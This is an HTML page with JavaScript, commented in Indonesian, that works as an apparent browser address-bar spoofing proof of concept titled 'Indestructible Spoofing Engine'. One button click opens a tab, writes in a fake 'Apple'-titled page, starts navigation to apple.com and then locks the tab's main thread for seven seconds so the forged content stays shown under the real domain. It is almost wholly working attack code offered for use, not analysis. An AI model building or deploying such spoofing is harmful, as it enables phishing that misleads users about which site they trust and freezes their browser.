<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>Ultimate Indestructible Force Lock - HALLO</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #09090b;
        color: #fff;
        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      }
      .container {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100%;
        gap: 16px;
        padding: 20px;
        box-sizing: border-box;
      }
      h1 {
        font-size: 22px;
        margin-bottom: 10px;
        color: #f5f5f7;
        text-align: center;
      }
      button {
        width: 100%;
        max-width: 420px;
        padding: 24px;
        font-size: 20px;
        font-weight: bold;
        background: #ff3b30;
        color: #fff;
        border: none;
        border-radius: 16px;
        cursor: pointer;
        box-shadow: 0 8px 24px rgba(255, 59, 48, 0.45);
        transition: transform 0.1s ease;
      }
      button:active {
        transform: scale(0.96);
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h1>Indestructible Spoofing Engine</h1>
      <button id="startBtn">EXECUTE UNBREAKABLE LOCK</button>
    </div>

    <script>
      document.getElementById("startBtn").onclick = function () {
        this.style.display = 'none';

        // 1. Membuka jendela baru secara instan
        const newTab = window.open("", "_blank");

        if (newTab) {
          // 2. Menyuntikkan template dokumen HTML mandiri yang membawa script pertahanan mandiri (Self-Healing DOM)
          newTab.document.write(`
            <!DOCTYPE html>
            <html>
            <head>
              <title>Apple</title>
              <meta name="viewport" content="width=device-width, initial-scale=1">
            </head>
            <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
              <h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>
              <script>
                // Self-Healing Shield: Jika ada upaya pembersihan atau penimpaan elemen, langsung regenerasi paksa
                setInterval(() => {
                  if (!document.getElementById('spoof-text') || document.body.innerText.trim() !== 'HALLO') {
                    document.open();
                    document.write('<!DOCTYPE html><html><head><title>Apple</title><meta name="viewport" content="width=device-width, initial-scale=1"></head><body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;"><h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1></body></html>');
                    document.close();
                  }
                }, 5);
              <\/script>
            </body>
            </html>
          `);
          newTab.document.close();

          try { newTab.focus(); } catch (e) {}

          // 3. Timing 1 (6ms): Memicu tarikan navigasi asinkron mutlak ke apple.com agar address bar berubah terpampang
          setTimeout(() => {
            try {
              newTab.location.href = "https://apple.com";
            } catch (err) {}
          }, 6);

          // 4. Timing 2 (20ms): Mengunci main thread secara sinkronus untuk menahan antrean render pipeline pusat
          setTimeout(() => {
            try {
              newTab.eval(`
                const startTime = Date.now();
                while (Date.now() - startTime < 7000) {
                  const reflow = document.body.offsetHeight;
                  document.body.style.backgroundColor = (reflow % 2 === 0) ? '#ffffff' : '#fefefe';
                  
                  if (!document.getElementById('spoof-text')) {
                    document.body.innerHTML = '<h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
                  }
                }
              `);
            } catch (e) {
              let start = Date.now();
              while (Date.now() - start < 7000) {}
            }
          }, 20);
        }
      };
    </script>
  </body>
</html>
